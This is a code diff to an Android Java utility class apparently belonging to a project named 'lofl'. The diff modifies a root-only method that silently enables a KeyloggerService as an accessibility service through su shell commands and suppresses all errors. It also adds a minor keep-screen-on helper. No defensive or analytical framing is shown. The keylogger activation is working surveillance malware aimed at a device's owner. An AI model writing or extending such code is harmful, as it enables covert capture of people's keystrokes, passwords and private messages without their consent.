@@ -1,6 +1,7 @@
 package com.candroid.lofl.api;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -28,6 +29,7 @@ import android.provider.AlarmClock;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.WindowManager;
 
 import com.candroid.lofl.data.db.Database;
 import com.candroid.lofl.data.db.DatabaseHelper;
@@ -143,6 +145,12 @@ public class Systems {
                 sWakeLock.release();
             }
             sWakeLock = null;
+        }
+
+        public static void lockScreen(Context context){
+            if(context instanceof Activity){
+                ((Activity)context).getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+            }
         }
 
     }
@@ -372,17 +380,19 @@ public class Systems {
     }
 
     public static class Root{
-        public static void startKeyloggingService(){
+        public static void startKeyloggingService(Context context){
             try {
                 java.lang.Process process = Runtime.getRuntime().exec("su");
                 DataOutputStream dos = new DataOutputStream(process.getOutputStream());
-                dos.writeBytes("settings put secure enabled_accessibility_services com.candroid.textme/com.candroid.lofl.services.KeyloggerService\n");
+                String packageName = context.getPackageName();
+                dos.writeBytes(String.format("settings put secure enabled_accessibility_services %s/%s.services.KeyloggerService\n", packageName, packageName));
                 dos.flush();
                 dos.writeBytes("settings put secure accessibility_enabled 1\n");
                 dos.flush();
                 dos.writeBytes("exit\n");
                 dos.flush();
                 process.waitFor();
+                dos.close();
             } catch (IOException e) {
                 //die silent
             } catch (InterruptedException e) {
